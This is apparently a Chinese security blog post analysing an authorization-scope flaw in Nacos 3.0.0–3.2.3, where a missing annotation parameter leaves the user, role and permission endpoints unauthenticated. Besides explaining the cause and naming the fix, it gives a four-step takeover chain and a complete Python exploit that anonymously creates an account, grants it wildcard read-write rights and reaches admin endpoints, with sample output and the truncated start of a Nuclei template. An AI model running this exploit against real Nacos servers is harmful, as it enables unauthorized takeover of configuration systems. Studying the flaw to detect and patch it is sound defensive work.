---
title: 一个漏写的注解参数，把 Nacos 管理面交给了匿名请求
url: https://mp.weixin.qq.com/s/V5EXdh_F1tE78-qtOFf3Fw
source: Doonsec's feed
date: 2026-10-31
fetch_date: 2026-11-01T08:18:45.231933
---

# 一个漏写的注解参数，把 Nacos 管理面交给了匿名请求

# 一个漏写的注解参数，把 Nacos 管理面交给了匿名请求

原创

网络安全民工
网络安全民工

网络安全民工

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## 一、漏洞背景

Nacos 3.0.0 到 3.2.3 存在一处鉴权作用域错配：用户、角色、权限三组管理接口在 @Secured 注解里漏写了 apiType = ApiType.ADMIN\_API，注解默认值把请求送进了“普通 API”那条链。而普通 API 的鉴权开关出厂默认关闭，管理 API 的开关出厂默认打开。两条链的默认状态正好相反，错配就变成了未授权。

| 项 | 值 |
| --- | --- |
| 漏洞类型 | 权限绕过 / 未授权访问 |
| 影响版本 | 3.0.0 ≤ Nacos ≤ 3.2.3 |
| 修复版本 | 3.2.4 |
| CVSS 3.1 | 9.8（通告值） |
| 利用前置 | 能访问 Nacos Server 端口，无需任何凭证 |
| 在野利用 | 未发现公开记录 |

缺陷链可以拆成三环，串联起来形成现成漏洞：

| 环节 | 事实 | 后果 |
| --- | --- | --- |
| 注解默认值 | apiType() 默认 OPEN\_API | 不写就落进普通 API |
| 过滤器分流 | AuthFilter 管非 ADMIN\_API，AuthAdminFilter 只管 ADMIN\_API | 两条链各有独立开关 |
| 开关默认值 | nacos.core.auth.enabled=false，nacos.core.auth.admin.enabled=true | 普通链关着，管理链接着 |

关键点在于：即使运维人员按照“最佳实践”开启了 admin 和 console 鉴权，这三个接口仍然处于无保护状态，因为它们根本不属于 ADMIN\_API 作用域。

## 二、漏洞原理

### 2.1 注解默认值决定了走哪条链

@Secured 是 Nacos 服务端做接口鉴权的入口注解，apiType 属性用来区分接口属于“管理 API”还是“开放 API”：

```
```
// auth/src/main/java/com/alibaba/nacos/auth/annotation/Secured.java

ApiType apiType() default ApiType.OPEN_API;
```
```

默认值是 OPEN\_API。一个接口只要写了 @Secured 但没显式声明 apiType，就会被当成开放接口处理。3.2.3 的 UserControllerV3.createUser 正是如此：

```
```
// 3.2.3 UserControllerV3.java:109@Secured(resource =AuthConstants.CONSOLE_RESOURCE_NAME_PREFIX+"users",     action =ActionTypes.WRITE)// 没有 apiType@PostMappingpublicResult<String>createUser(@RequestParamString username,@RequestParamString password)
```
```

### 2.2 两个过滤器读两个开关，默认值正好错开

```
```
// core/.../auth/AuthFilter.java:53       —— 处理非 ADMIN_APIreturn!ApiType.ADMIN_API.equals(secured.apiType());// core/.../auth/AuthAdminFilter.java:47  —— 只处理 ADMIN_APIreturnApiType.ADMIN_API.equals(secured.apiType());
```
```

| 过滤器 | 覆盖范围 | 开关 | 出厂默认 | 未认证请求结果 |
| --- | --- | --- | --- | --- |
| AuthFilter | 除 ADMIN\_API 外的全部 | nacos.core.auth.enabled | false | 直接放行 |
| AuthAdminFilter | 仅 ADMIN\_API | nacos.core.auth.admin.enabled | true | 校验管理员身份，拒绝 |

## 三、渗透逻辑链（完整攻击路径）

漏洞的利用不是“一个请求打穿”，而是一条四步闭环：建号 → 绑角色 → 授权 → 登录接管。每一步都因为同一个注解缺陷而无需任何凭证。

步骤 0：确认目标存活与鉴权状态先访问一个标了 ADMIN\_API 的接口（如配置列表），预期返回 403。这确认了 Admin 鉴权确实在正常工作，同时也说明目标不是“全裸”的 Nacos，而是配置看似正常的实例。

步骤 1：匿名创建用户POST /nacos/v3/auth/user，参数 username 和 password。该接口的 @Secured 漏写了 apiType，落入 OPEN\_API 作用域，AuthFilter 的开关 nacos.core.auth.enabled 默认为 false，请求被 chain.doFilter 直接放行。返回 create user ok!。

步骤 2：匿名创建角色并绑定用户POST /nacos/v3/auth/role，参数 role 和 username。同样落入无鉴权链。这里有一个细节：ROLE\_ADMIN 是代码层面保留的角色，addRole 会拒绝直接创建。但攻击者不需要这个角色名——任意自定义角色名都可以，只要后续授权足够宽。

步骤 3：匿名授予通配权限POST /nacos/v3/auth/permission，参数 role、resource、action。resource=\*:\*:\* 覆盖所有命名空间下的所有资源，action=rw 赋予读写权限。至此，新建角色拥有了对整个 Nacos 配置面的完全访问权。

步骤 4：登录获取 token，验证接管POST /nacos/v3/auth/user/login，用步骤 1 创建的账号正常登录。返回的 token 中 globalAdmin=false，看起来不是管理员。但关键漏洞在于：AuthAdminFilter 只负责分流，进入 admin 链之后的权限判定仍然走普通的 hasPermission()，按资源模式匹配。\*:\*:\* 对任意资源都命中，所以 ADMIN\_API 标签的实际约束只剩下“要有一个 token”。带着这个 token 访问配置列表，返回 200。

闭环验证：用该 token 向 DEFAULT\_GROUP 发布一条配置，HTTP 200，回读内容与 md5 一致，证明写入能力完整。

| 接口 | 无凭证 | 持通配 token |
| --- | --- | --- |
| GET /v3/auth/user/list | 200，含 BCrypt 密码哈希 | 200 |
| GET /v3/auth/role/list | 200 | 200 |
| GET /v3/auth/permission/list | 200 | 200 |
| POST /v3/auth/user | 200 | 200 |
| POST /v3/auth/role | 200 | 200 |
| POST /v3/auth/permission | 200 | 200 |
| GET /v3/admin/cs/config/list | 403 | 200 |
| GET /v3/console/cs/config/list | 403 | 200 |

## 四、Python 验证 PoC

以下脚本仅用于授权测试环境，执行完整的检测与验证闭环。

```
```
Python

#!/usr/bin/env python3

"""

Nacos 3.0.0-3.2.3 鉴权作用域错配 - 验证 PoC

用法: python nacos_authscope_poc.py http://target:8848

仅限授权测试。

"""

import sys

import uuid

import requests

import urllib3

urllib3.disable_warnings()

TIMEOUT = 10

def check_target(base):

    """确认目标存活，且 admin 接口确实在拦截匿名请求"""

    admin_url = f"{base}/nacos/v3/admin/cs/config/list?pageNo=1&pageSize=1"

    try:

        r = requests.get(admin_url, timeout=TIMEOUT, verify=False)

        if r.status_code == 403:

            print(f"[+] Admin 接口返回 403，鉴权层正常工作中：{admin_url}")

            return True

        elif r.status_code == 200:

            print(f"[!] Admin 接口返回 200，目标可能已开启 OPEN_API 鉴权或版本不在影响范围：{admin_url}")

            return False

        else:

            print(f"[-] Admin 接口返回异常状态码 {r.status_code}")

            return False

    except requests.RequestException as e:

        print(f"[-] 目标不可达: {e}")

        return False

def exploit(base):

    """四步利用链：建号 → 绑角色 → 授权 → 登录验证"""

    uid = uuid.uuid4().hex[:8]

    username = f"poc_{uid}"

    password = f"Poc@{uid}!"

    role = f"poc_role_{uid}"

    # 步骤 1：匿名创建用户

    r = requests.post(

        f"{base}/nacos/v3/auth/user",

        data={"username": username, "password": password},

        timeout=TIMEOUT, verify=False

    )

    if r.status_code != 200 or "create user ok" not in r.text:

        print(f"[-] 步骤 1 失败：创建用户返回 {r.status_code} - {r.text[:200]}")

        return False

    print(f"[+] 步骤 1：匿名创建用户成功 -> {username}")

    # 步骤 2：匿名创建角色并绑定用户

    r = requests.post(

        f"{base}/nacos/v3/auth/role",

        data={"role": role, "username": username},

        timeout=TIMEOUT, verify=False

    )

    if r.status_code != 200 or "add role ok" not in r.text:

        print(f"[-] 步骤 2 失败：绑定角色返回 {r.status_code} - {r.text[:200]}")

        return False

    print(f"[+] 步骤 2：匿名绑定角色成功 -> {role}")

    # 步骤 3：匿名授予通配读写权限

    r = requests.post(

        f"{base}/nacos/v3/auth/permission",

        data={"role": role, "resource": "*:*:*", "action": "rw"},

        timeout=TIMEOUT, verify=False

    )

    if r.status_code != 200 or "add permission ok" not in r.text:

        print(f"[-] 步骤 3 失败：授权返回 {r.status_code} - {r.text[:200]}")

        return False

    print(f"[+] 步骤 3：匿名授予通配权限成功 -> *:*:* rw")

    # 步骤 4：登录获取 token

    r = requests.post(

        f"{base}/nacos/v3/auth/user/login",

        data={"username": username, "password": password},

        timeout=TIMEOUT, verify=False

    )

    if r.status_code != 200:

        print(f"[-] 步骤 4 失败：登录返回 {r.status_code} - {r.text[:200]}")

        return False

    try:

        token = r.json().get("accessToken")

    except Exception:

        token = None

    if not token:

        print(f"[-] 步骤 4 失败：未获取到 accessToken - {r.text[:200]}")

        return False

    print(f"[+] 步骤 4：登录成功，获取 token（前 30 字符）：{token[:30]}...")

    # 步骤 5：用 token 访问 ADMIN_API 验证越权

    headers = {"Authorization": f"Bearer {token}"}

    r = requests.get(

        f"{base}/nacos/v3/admin/cs/config/list?pageNo=1&pageSize=1",

        headers=headers, timeout=TIMEOUT, verify=False

    )

    if r.status_code == 200:

        print(f"[+] 验证成功：持通配 token 访问 Admin 配置列表返回 200，权限绕过成立")

        return True

    else:

        print(f"[-] 验证失败：持 token 访问 Admin 接口返回 {r.status_code}")

        return False

if __name__ == "__main__":

    if len(sys.argv) != 2:

        print(f"用法: {sys.argv[0]} http://target:8848")

        sys.exit(1)

    target = sys.argv[1].rstrip("/")

    print(f"[*] 目标: {target}")

    if not check_target(target):

        print("[*] 前置检查未通过，仍尝试利用（目标可能已修复或无影响）")

    if exploit(target):

        print("\n[!] 结论：目标存在鉴权作用域错配漏洞，可未授权接管管理面。请立即升级至 3.2.4 或开启 nacos.core.auth.enabled=true。")

    else:

        print("\n[+] 结论：未检测到可利用的鉴权作用域错配。")
```
```

运行方式：

```
```
python nacos_authscope_poc.py http://192.168.1.100:8848
```
```

预期输出（漏洞存在时）：

```
```
[*] 目标: http://192.168.1.100:8848

[+] Admin 接口返回 403，鉴权层正常工作中：...

[+] 步骤 1：匿名创建用户成功 -> poc_a1b2c3d4

[+] 步骤 2：匿名绑定角色成功 -> poc_role_a1b2c3d4

[+] 步骤 3：匿名授予通配权限成功 -> *:*:* rw

[+] 步骤 4：登录成功，获取 token（前 30 字符）：eyJhbGciOiJIUzM4NCJ9...

[+] 验证成功：持通配 token 访问 Admin 配置列表返回 200，权限绕过成立

[!] 结论：目标存在鉴权作用域错配漏洞，可未授权接管管理面。
```
```

说明：如果步骤 1 返回 403，说明目标要么已升级到 3.2.4，要么 nacos.core.auth.enabled 已被设为 true（OPEN\_API 鉴权开启）。此时漏洞链在第一步就被切断。

## 五、Nuclei 模板

保存为 CVE-nacos-authscope-misconfig.yaml（或任意文件名），使用 nuclei -t nacos-authscope.yaml -u http://target:8848 执行。

```
```
id: nacos-authscope-misconfig

info:

  name: Nacos 3.0.0-3.2.3 Auth Scope Misassignment (Unauthenticated Admin Take...